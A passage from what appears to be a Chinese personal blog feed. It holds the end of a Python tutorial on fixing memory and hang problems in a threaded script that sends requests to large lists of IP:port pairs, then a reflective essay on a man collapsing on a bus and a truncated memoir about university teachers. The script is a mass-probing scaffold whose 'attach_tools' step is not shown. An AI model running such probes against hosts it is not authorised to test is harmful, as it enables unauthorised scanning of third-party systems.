class="hljs-keyword">not</span> ip_queue.empty():<br>                        <span class="hljs-keyword">try</span>:<br>                            ip_port = ip_queue.get(block=<span class="hljs-literal">False</span>)<br>                            future_dict[executor.submit(get_url, ip_port[<span class="hljs-number">0</span>], ip_port[<span class="hljs-number">1</span>])] = ip_port<br>                        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                            print(e)<br><br>                    <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> concurrent.futures.as_completed(future_dict, timeout=<span class="hljs-number">30</span>):<br>                        ip_port = future_dict[future]<br>                        <span class="hljs-keyword">try</span>:<br>                            data = future.result()<br>                        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> exc:<br>                            print(<span class="hljs-string">&#x27;%r generated an exception: %s&#x27;</span> % (ip_port, exc))<br>                        <span class="hljs-keyword">else</span>:<br>                            print(data)<br>                    future_dict.clear()<br><br>    print(<span class="hljs-string">&quot;finish&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><h2 id="跑着跑着就被系统kill了"><a href="#跑着跑着就被系统kill了" class="headerlink" title="跑着跑着就被系统kill了"></a>跑着跑着就被系统kill了</h2><p>就像预期的，上面第二版的程序在刚开始运行的时候可以正常跑，但是跑一段时间后，会没有任何提示，直接被系统kill掉。为什么呢？通过<code>htop</code>监控程序运行过程中的状态，我发现内存会明显随着运行时间的边长也增大。</p><p>既然使用了<code>Queue</code>，程序中该清理释放内存的地方（比如<code>future_dict</code>都做了相应的的处理），那为什么内存还会出问题呢？其实，有两点：**<code>concurrent.future</code>的内存释放机制和卡死的requests请求。**</p><h3 id="concurrent-future的内存释放机制"><a href="#concurrent-future的内存释放机制" class="headerlink" title="concurrent.future的内存释放机制"></a>concurrent.future的内存释放机制</h3><p>第二版有一个<strong>致命</strong>的地方：<strong>我们使用了with的方式开了一个<code>Executor</code>，第35行虽然设置了超时，但是concurrent.future只会等所有子线程执行完成后才会<code>return</code>并释放内存，可以仔细读一下下图的相关说明。</strong></p><center><img src="https://pic.gaficat.com/default/concurrent内存清理机制.png" alt="concurrent内存清理机制" style="zoom: 50%;" /></center><blockquote><p>第二版程序的35行设置了超时，所以程序执行的逻辑是：<code>ip_queue</code>第一次满之后，开一个<code>executor</code>，对<code>ip_queue</code>中的ip进行处理，但由于一些未知的异常，导致某一些子线程没有在30秒的时间内执行完，这时主线程会报超时的错误，不等第一个<code>executor</code>所有的子线程执行完，释放内存，就直接进入下一轮。如果第一轮的子线程能处理好所有异常，在之后退出，那么不会有内存问题，因为虽然提前进入了第二轮，某个时段存在两个甚至多个<code>executor</code>，但前面的<code>executor</code>总会退出的，内存总会释放的，对吧。</p><p>但事实和我们想的不一样，子线程实际上是在执行<code>get_url()</code>函数，若<code>get_url()</code>函数本身逻辑有问题，没有办法处理所有的异常被挂起，那么就会有相当的<code>executor</code>挂着，不能释放，当内存占用到一定程度，操作系统自然就会kill掉我们的程序了。</p></blockquote><h3 id="requests卡死？挂起？"><a href="#requests卡死？挂起？" class="headerlink" title="requests卡死？挂起？"></a>requests卡死？挂起？</h3><p>正常来说，我们第二版的代码里面，<code>requests</code>是设了超时的，但为什么<code>get_url()</code>函数就卡死了呢？其实部分IP，可能它返回的内容非常大，requests默认的get，会将其临时保存在内存中，那假如我们爬虫同时遇到10个返回100Mb内容的IP，1个Gb的内容，1M的带宽，算算要多久才能下完？当然就卡住了。带宽越大，下得越快，线程越多，内存炸的也就更快。</p><p>咋办呢？其实requests提供了流的模式，使用方式参照官方的文档吧，这里贴一个官方例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> requests<br><br>r = requests.get(<span class="hljs-string">&#x27;https://httpbin.org/stream/20&#x27;</span>, stream=<span class="hljs-literal">True</span>)<br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> r.iter_lines():<br><br>    <span class="hljs-comment"># filter out keep-alive new lines</span><br>    <span class="hljs-keyword">if</span> line:<br>        decoded_line = line.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        print(json.loads(decoded_line))<br></code></pre></td></tr></table></figure><p>根据需求改动下，实时写入文件就行了。</p><h2 id="设置子线程的超时异常？"><a href="#设置子线程的超时异常？" class="headerlink" title="设置子线程的超时异常？"></a>设置子线程的超时异常？</h2><p>上面分析了被系统kill的原因，实际上还是内存炸了，所以修改了代码，<strong>第三版程序</strong>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">import</span> queue<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> ctime<br><br>ip_queue = queue.Queue(<span class="hljs-number">100</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_url</span>(<span class="hljs-params">ip, port</span>):</span><br>    <span class="hljs-keyword">try</span>:<br><br>        r = requests.get(<span class="hljs-string">&quot;http://&#123;&#125;:&#123;&#125;/path_info&quot;</span>.format(ip, port),<br>                         timeout=<span class="hljs-number">5</span>, stream=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">return</span> next(r.iter_lines())<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> e<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    future_dict = &#123;&#125;<br>    <span class="hljs-keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="hljs-number">10</span>) <span class="hljs-keyword">as</span> executor:<br>        <span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;./ipfile&quot;</span>) <span class="hljs-keyword">as</span> f:  <br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ip_queue.full():<br>                    ip_queue.put(line.strip().split(<span class="hljs-string">&quot;,&quot;</span>))<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> ip_queue.empty():<br>                        <span class="hljs-keyword">try</span>:<br>                            ip_port = ip_queue.get(block=<span class="hljs-literal">False</span>)<br>                            future_dict[executor.submit(get_url, ip_port[<span class="hljs-number">0</span>], ip_port[<span class="hljs-number">1</span>])] = ip_port<br>                        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                            print(e)<br><br>                    <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> concurrent.futures.as_completed(future_dict, timeout=<span class="hljs-number">30</span>):<br>                        ip_port = future_dict[future]<br>                        <span class="hljs-keyword">try</span>:<br>                            data = future.result()<br>                        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> exc:<br>                            print(<span class="hljs-string">&#x27;%r generated an exception: %s&#x27;</span> % (ip_port, exc))<br>                        <span class="hljs-keyword">else</span>:<br>                            print(data)<br>                    future_dict.clear()<br><br>    print(<span class="hljs-string">&quot;finish&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>结果呢，还是没能如愿，程序依然会出现卡死的现象。后来我分析原因，是部分IP不太正常，会一直返回内容，类似摄像头，所以永远不可能接收完内容，那这个子线程就一直挂着了。咋办？我就想，能不能设置子线程的超时，后来发现了一个库：<code>eventlet</code>。</p><p>所以最终，<strong>第四版程序</strong>的样子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> requests.auth <span class="hljs-keyword">import</span> HTTPBasicAuth<br><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">import</span> queue<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> ctime<br><span class="hljs-keyword">import</span> eventlet<br><br>eventlet.monkey_patch()<br><br>ip_queue = queue.Queue(<span class="hljs-number">200</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_url</span>(<span class="hljs-params">ip, port</span>):</span><br>    <span class="hljs-keyword">with</span> eventlet.Timeout(<span class="hljs-number">20</span>):<br>        <span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> s:<br>            <span class="hljs-keyword">try</span>:<br>                r = s.get(<span class="hljs-string">&quot;http://&#123;&#125;:&#123;&#125;/path_info&quot;</span>.format(ip, port),<br>                           timeout=(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>))<br>                s.close()<br>                <span class="hljs-keyword">return</span> r.text<br>            <span class="hljs-keyword">except</span> eventlet.timeout.Timeout <span class="hljs-keyword">as</span> e:<br>                print(<span class="hljs-string">&quot;eventlet timeout:&quot;</span>, e)<br>                s.close()<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                s.close()<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">multithread_attach</span>():</span><br>    future_dict = &#123;&#125;<br>    <span class="hljs-keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="hljs-number">100</span>) <span class="hljs-keyword">as</span> executor:<br>        ip_port = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> ip_queue.empty():<br>            <span class="hljs-keyword">try</span>:<br>                ip_port = ip_queue.get(block=<span class="hljs-literal">False</span>)<br>                <span class="hljs-comment"># print(ip_port)</span><br>                future_dict[executor.submit(attach_tools, ip_port[<span class="hljs-number">0</span>], ip_port[<span class="hljs-number">1</span>])] = ip_port<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                print(e)<br>        print(<span class="hljs-string">&quot;time:&#123;&#125;&quot;</span>.format(ctime()), <span class="hljs-string">&quot;200&quot;</span>, <span class="hljs-string">&quot;start attach&quot;</span>)<br>        print(<span class="hljs-string">&quot;last ip:&quot;</span>, ip_port)<br><br>        <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> concurrent.futures.as_completed(future_dict):<br>            ip_port = future_dict[future]<br>            <span class="hljs-keyword">try</span>:<br>                data = future.result()<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> exc:<br>                print(<span class="hljs-string">&#x27;%r generated an exception: %s&#x27;</span> % (ip_port, exc))<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">pass</span><br>        print(<span class="hljs-string">&quot;time:&#123;&#125;&quot;</span>.format(ctime()), <span class="hljs-string">&quot;200&quot;</span>, <span class="hljs-string">&quot;finish attach&quot;</span>)<br>        print(<span class="hljs-string">&quot;last ip:&quot;</span>, ip_port, <span class="hljs-string">&quot;\n&quot;</span>)<br>    <span class="hljs-keyword">del</span> future_dict<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;./ipfile&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ip_queue.full():<br>                ip_queue.put(line.strip().split(<span class="hljs-string">&quot;,&quot;</span>))<br>            <span class="hljs-keyword">else</span>:<br>                multithread_attach()<br><br>    multithread_attach()<br>    print(<span class="hljs-string">&quot;finish&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>其实，收获最大的是concurrent.future的内存处理机制吧，这个坑肯定是不踩不知道的，python好像主动停止正在运行的子线程也比较麻烦，所以eventlet这个库，在某些场景给子线程设置超时也是一种挺好的方式。</p>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>目睹有人在我面前倒下时，我在想什么</title>
    <link href="/posts/a1558b50.html"/>
    <url>/posts/a1558b50.html</url>
    
    <content type="html"><![CDATA[<p><strong>你有想过在一米左右的距离，亲眼目睹有人在你面前倒下吗？</strong></p><p>前几天，同事在群里分享了一个视频，是某互联网公司的程序员，倒在地上呻吟，旁边人在议论，到底打120还是怎么办，园区有没有医生。当时的感受是，一方面觉得IT行业的从业者压力真的很大，另一方面觉得人与人之间很冷漠，甚至都没有一个人扶起那个在地上呻吟的人。</p><p>我在一家网络安全公司的研究部门工作，弹性工作制，每天打满9个小时卡就行了，没有KPI压力，没有领导的压力。所以，基本上在领导给的大方向内，有所产出即可，这就是我们的工作内容。至于如何完成工作，可以按照自己的想法，可以大家一起讨论请教，没有人强迫。所以，我个人始终很难理解，IT行业真的有那么多的代码要写吗？真的要每天加班到那么晚吗？我一直觉得身边的人，工作状态都很好，<strong>我真的没有想到，自己离视频里，目睹一个人在自己面前突然倒的场景这么近。</strong></p><h1 id="那个男人倒下了"><a href="#那个男人倒下了" class="headerlink" title="那个男人倒下了"></a>那个男人倒下了</h1><p>我工作的地方，IT公司非常集中，最近天气预报一直有雨，没有办法骑自己的小摩托，这几天就只好坐公交通勤。公交一路开过去，会经过华为、阿里云、三星、中软国际等等IT或者外包企业。公交车上的人，有像我这样双肩包格子衫的IT男，也有露腰热裤精致包包的漂亮小姐姐。</p><p>我一般喜欢在坐车的时候往车厢最后面走，因为最后面通常会有人下车，大概率会混到一个座。今天上班路上，如愿以偿，我又混到了一个座，一路上我都在发呆，“士不可以不弘毅啥意思来着？”、“坐而论道不如起而行之出处是什么？反正肯定不是王兴的饭否。”、“昨天那个问我iBeacon的少年，我不回他了吧，真是超级简单的问题啊，自己查查百度都能查到的，非要来问别人”。</p><p>“扑通通”，突然挺闷几声异响瞬间打断了我的思绪，我甚至还没来得及聚集自己的目光，看清楚发生了什么，就只感觉前方的车厢开始骚动，定睛一看，我发现前方1米左右走廊的地上，侧卧着一个人，旁边的人很慌乱。</p><blockquote><p>侧卧的人，30岁左右，一件深蓝色工装外套，黑色工装裤，联想电脑包，银色眼镜，头发蓬乱，皮肤黝黑。没有呻吟，没有抽搐，就很安静的倒在走廊上。</p></blockquote><p>这时候旁边一个打扮清爽，五官清秀的男生没有丝毫犹豫，几乎是男人倒下的瞬间，马上反应了过来，一边示意周围人帮忙喊司机停车，一边弯下腰拍那个倒下男人的肩膀，确认他是否清醒，周围的人便大声呼喊司机停车。确认男人神智清醒后，那个男生和旁边的人一起，将男人扶起，坐到座位上，整个过程不到20秒。</p><p>我就在不到一米左右距离的座位上，目睹了整个过程，没有做任何事，内心似乎没有一丝波澜，整件事跟我没有任何关系一样。我当时在想什么？我第一时间想到的是，夏天的公交司机，开车非常毛躁，估计是没站稳摔了一跤吧？肯定自己就爬起来了。见那个男人第一时间没起来，我又在想，是不是没吃早饭就急着赶车上班，低血糖晕了？该不会和前几天同事发的那个视频一样，突然就猝死吧？是不是要耽误很多时间啊？我是不是应该下车啊？我应不应该过去帮他啊？万一他出事了，他的家人讹我咋办？</p><h1 id="怎么搞成这个样子了"><a href="#怎么搞成这个样子了" class="headerlink" title="怎么搞成这个样子了"></a>怎么搞成这个样子了</h1><p>我不知道自己为什么突然就变成了一个这么冷漠的人。我想起了自己小时候的两件事。</p><blockquote><p>有一天和父亲回家，前方两三米的地方，眼睁睁就看着一个老大爷从站着，到身子一点点向后倾斜，最后一屁股就从马路牙子上倒在了马路上。父亲当时想都没有想，拉着我就去扶老爷爷起来，那个老爷爷面容慈祥，满头银丝，扶起他我记得花了挺大的力气。扶老爷爷坐在路旁后，我们问他用不用打120，老爷爷说不用，自己坐一会儿缓缓就行了。确认老爷爷没有大碍后，我和父亲就离开了，父亲说：“你认识那个老爷爷吗？他是我们家属院的XXX，可能刚才没站稳吧。本身认识加上那个老爷爷平时身体不错，所以爸爸才没有犹豫，带你去扶他。”</p></blockquote><blockquote><p>我记得还有一次，那是一个夏天的傍晚，我和父母去江边遛弯，回家的路上，看到路边趴着一个流浪的老妪。夏天的闷热，我们穿着短袖短裤都难以忍耐，但那个老妪却裹着厚厚棉袄（那件满是破洞的棉袄，棉花都看不出白色了）。傍晚光线昏暗，加上她黑黑的皮肤和脏臭的衣服混在一起，根本分不清头发、脸庞和身子。我记得当时还挺害怕的，就想快点走开，这时候父母拉住了我，说我们要帮帮她。于是我去不远的小卖部买了牛奶和面包（花的是我自己的私房钱，因为做好事，虽然花自己的前，但我也可开心了），店员问我为什么买牛奶面包，我说那边有个老奶奶饿的走不动了，我想帮她。我把牛奶面包买回来便递给父母，觉得自己任务完成了，我还是很怕那个老妪，但父母说：“你自己去拿给那个老奶奶，我们在你后面看着你，你很安全。”我没办法，只能壮着胆子去。我故作镇定走过去，把牛奶面包放到那个老奶奶面前，拔腿就想跑，全程只看着她前方的地面，不敢看她长什么样子。她看到我们拿来了吃的，说了句不知道是哪的方言，我知道那是谢谢。</p><p>最后她似乎连拿起食物，撕开包装的力气都没有，我也没有管那么多，只是觉得自己任务完成了，一身轻，马上就跑开了。</p><p>其实，我现在想起这件事，我意识到一件很荒唐的事情，那个老妪的对面，就是我们当地一家非常不错的医院，就在街对面。一条街，一边是医院灯火通明的高楼；另一边是光线昏暗的拆迁区，一个夏天裹着棉袄的流浪老妪没有人管。</p></blockquote><p>所以，我从小受到的教育，都是竭尽自己的所能去帮助别人，一直以来，我也都是那么做的。但不知不觉，我的世界观就被改变了，媒体大肆报道某某学生帮助老人反被讹，慢慢让你就对这个世界失望，不敢去做正确的事情了。父母，恋人，逐渐也都说，“你别去给别人添乱，保护好自己就行了，别管别人的事。”</p><p>我真的一直有一个帮助别人的心，我记得上大学那会儿，我还花了几千块，参加学校急救的培训。手机里那张我被同伴练手，胳膊榜上绷带挂了彩，我自己还开心的不行的照片不知道还找不找得到了。我印象很深的是，老师在教授每个技能的时候，首先都是告诉我们，<strong>先保护好自己，再去救人</strong>。比如确认一个人是不是还活着，要去摸脉搏，这个时候不能直接从正面上手，抓着脖子摸。而是握拳，伸出食指和中指，用指腹贴到被救人靠近你自己这一侧的脖子上。为什么不贴到另一侧，因为一旦被人从正面拍到，你的手势极有可能被认为是在掐被救人的脖子，你自己知道你是在摸脉搏，但是你解释不清楚。</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>我真的希望自己做一个很纯粹的人，像那个长相清秀的男生一样，遇到需要帮助的人毫不犹豫。但，也许我变了吧，当你掌握了急救的技巧，拿了证书，真遇到了事，却并不敢去救人，想到的全是自保，真的是一件很痛苦的事。</p><p>那个30岁的男人，背后是妻子，孩子，四个老人。大概率他的父母、妻子、孩子不会知道自己的儿子、丈夫、父亲今天上班突然倒下了。他回家可能依然会说：</p><ul><li>爸妈，我很好，工作虽然辛苦，但是薪水还行。</li><li>老婆，我很好，发奖金了给你买喜欢的那件连衣裙。</li><li>儿子，我很好，好好学习（长大像你爸一样当程序员然后猝死），爸爸给你买PS4。</li></ul><p>越来越多的男人，就在我们眼前没有征兆倒下了，这是行业的悲哀还是这代人的悲哀？</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大学的那些老师们</title>
    <link href="/posts/4de16deb.html"/>
    <url>/posts/4de16deb.html</url>
    
    <content type="html"><![CDATA[<h1 id="怎么想起这个话题了"><a href="#怎么想起这个话题了" class="headerlink" title="怎么想起这个话题了"></a>怎么想起这个话题了</h1><p>最近感触很深，你很认真的去做一件事的时候，虽然会有键盘侠来烦你，但是总还是有支持你的人。当生活艰难的你，因为梦想不能支撑自己活下去而灰心的时候，突然看到你精心做的事，得到其他人的认可，真的还是内心很暖的。希望大家加油吧，<strong>坐而论道，不如起而行之</strong>，只要你用心做，会有人看到你的努力，看到你的工匠精神。</p><blockquote><p>我的<a href="https://www.gaficat.com/posts/bb4e922e.html">朋克风格TVOC传感器</a>，第一批样品做出来以后，本来以为没人买的，结果还是很快就卖完了。但是毕竟没有批量做一个东西，所以当时发现手工焊接难以保证精度的问题，没有有效的办法解决，所以就没有继续打样了。</p></blockquote><blockquote><p>但是，其实第一批打样卖完了以后，还是陆续有人来问，那个可爱的传感器还有没有卖的。最让我觉得暖心的是，很多人，在我明确表示没办法保证质量、焊接精度等问题，没有继续生产的计划，可以买其他人做的东西之后。依然选择很支持，我就认准你的，你之后做出来告诉我。真的谢谢你们！</p></blockquote><center><img src="https://pic.gaficat.com/default/TVOC支持的人.jpg" alt="TVOC支持的人" style="zoom:50%;" /></center><p>所以，思绪就转到大学了，那群实验室一起做东西的小伙伴。毕竟我做的TVOC传感器，硬件都是杜哥（大学时候做机器人比赛的队友）做的，这小东西真是太精致了。杜哥最近从某嵌入式公司离职了，回到了家乡重庆，大家都意识到了，身在异乡，真TMD不容易！后来想着想着，就突然想到了以前的一位大学老师，人是真的挺皮的。然后想到，我们当时的老师好像都挺有意思的，所以写一篇文章，回忆一下大学的那些老师吧！</p><h1 id="黄QQ"><a href="#黄QQ" class="headerlink" title="黄QQ"></a>黄QQ</h1><p>黄老师，我们都叫他黄QQ。没错，我首先想到的老师就是他，为啥呢？因为他真是最能和我们实验室小伙伴打成一片的老师了，准确来说，并不像一个老师，而像是一个学长。</p><p>我记得他的第一节课，课前我们一直在小声嘀咕，查了课表，这老师名字没听过啊？重庆大学博士？然后大家都没留意到，门口那个拿了一瓶可乐、骨骼惊奇、跟第一排同学聊天的人。直到后来上课了，这个少年捏着瓶子，抿了一口快乐水，就开始上课。黄QQ的课，大概讲了一些算法扫盲的内容，比如什么神经网络，蚁群算法之类的，最经典的，就是“你们信不信，我用Excel给你们实现一个神经网络”。</p><p>而真正和黄QQ有很多交集的起因，是一节课上，黄QQ得意的说：“你们大学期间就要抓紧时间多去认识一些姑娘呀！比如你们有嵌入式硬件上的技术，传媒学院那边有很多的女生，有各种创意和想法，你们就可以一起去碰撞一下想法，把一些东西转换成现实，甚至于去创业，对吧！”后来，我还在我的邮件里面，翻到了这个：</p><center><img src="https://pic.gaficat.com/default/传媒合作的邮件.png" alt="传媒合作的邮件" style="zoom:40%;" /></center><blockquote><p>你真的难以想象，只是我们后来才知道的，这个酷爱肥宅快乐水，身材消瘦，甚至有一些佝偻的工科男，竟然能找到一个传媒的老师当媳妇儿，嗨呀，就气啊！我TM好歹也是180的汉子啊，母胎单身了多少年了，哪有传媒的小姐姐，我要去撩小姐姐！</p></blockquote><p>我记得第一次去传媒那边找小姐姐，是他们期中的一个课程设计，是要求小姐姐们分成小组，每一个小组想一个创意，我们具体实现，她们完成一些外观上的设计和实现。有智能椅子，就是你坐上去，根据你重量的不同，发出不同声音的。有《一束光，一座城》，就是不同灯光打上去，会有不一样的造型。我就记得，当时去了以后，发现有一个小姐姐特别笑起来特别惊艳，就真的让你觉得不灵不灵那种，后来才知道，那是黄QQ的老婆。怎么讲呢，黄QQ也是刚博士毕业，黄QQ的老婆小谢年纪估计也不大，所以大家在一起真的感觉像是同龄人，不像是你见到其他的教授，需要俯身倾耳以请那样。</p><p>后来我们分到的小姐姐们，他们的题目是我们需要做一个点阵做成的屏幕，随着观众掌声逐渐增大，逐渐展现出一个图形。</p><center><img src="https://pic.gaficat.com/default/IMG_20161118_144228.jpg" alt="焊接滑稽" style="zoom:33%;" /></center><p>我们真是妥妥的直男啊，小姐姐们骗我们说她们是大四的，让我们叫学姐，我们那时候也是老实，哎。她们的组长，我们都叫她敏哥，主要是性格真的挺活泼的，像个男生一样，后来我们聊天，她说：“我其实也是一个特别内向的人，和你一样，只不过，都是被逼的，你没有办法，周围环境逼着必须去主动一些，所以就变成现在这样啦！”</p><p>对，回归正题，我们的目的不是去撩小姐姐嘛，有一次黄QQ就带我们去吃火锅，我现在还记得那是我第一次吃火锅见到猪脑，简直是噩梦~所以你说为啥想起大学老师第一个就想起黄QQ了，毕竟，大学有几个老师带你们去吃过火锅呢，对吧！吃着吃着，小谢就说：“唉，你耍朋友了嘛（重庆把搞对象称作耍朋友）？”我说：“没呢，这不跟着黄老师，就是想去撩传媒的小姐姐嘛，谢老师你那有合适的不？”她说：“有呀！小胡啊，你知道不？就是那个大眼睛，长头发，个子高高的，是我们班长。”我当然知道了，当时一起去的李哥（大学时的老乡），一眼就相中了人家。我说：“哎，其实我也挺想有这样一段关系的，不过吧，大三了，马上就该操心读研或者工作了，也拿捏不好时间。”黄QQ说：“哎呀，吃饭的时间总是有的嘛！”</p><p>黄QQ其实带我们做了非常多有意思的项目，很多东西改变了我对于单片机的看法，这代码还能这么写？我思维里，一直觉得那帮老教授，也就只会照着90年代的PPT念书，新的东西，比如STM32之类的，他们不会懂的。但我记得当时NRF的无线模块，7个模块组网给人折腾坏了，怎么弄调不好，结果黄QQ亲自上手，一晚上就搞定了，会写代码的博士，你得服啊！</p><p>啥？你们问我后来和小胡成没成？当然没有了，我后来混进了人家的班群，然后招摇过市的在人家班群里撩那个小姐姐，我觉得那时候我还挺讨厌的，虽然大家都知道在开玩笑，但毕竟不是每个女孩子都喜欢这样。不过后来我们关系还不错，她也喜欢石进，《夜的钢琴曲五》，我很快就练会了，还答应教她弹两只老虎，只是后来。。。。。。</p><p>我觉得我一直都是一个渴望纯粹感情的人，但我是一个非常矛盾的人。我后来细想，其实大学期间，我有过非常多的机会，有家里很有钱的本地姑娘；有每天晚上在琴房对面画画，然后来琴房找我的阿飘；有实验室撞倒的卡哇伊；也有琴房撞见练小提琴的计算机小姐姐~但总是在最后的时候，一念之间，我还是会选择把精力放在学业上，对我来说，虽然渴望感情，但我没有进到一所顶尖的大学，我需要在大学更努力，才能在之后有更好的生活吧。父亲是重感情的人，他在事业和感情之间选择了母亲，他本应该取得更大的成功的，所以，那时的我极力的想走父亲没有走的那条路，不希望感情影响了自己的前途。</p><p>认识黄QQ，真的很庆幸，他不仅仅在学业上给我们了很多的思路，更重要的，是他作为一个学长，一个过来人，告诉我们，要好好健身，要好好学习英语，对了，还有要好好撩妹，因为人生啊，除了学业、事业，还有很多更重要的事~但为啥黄QQ都把肉送到我嘴边了，我还给吐出去了，到底是什么学业让我那么着迷呢？这就得说我大学期间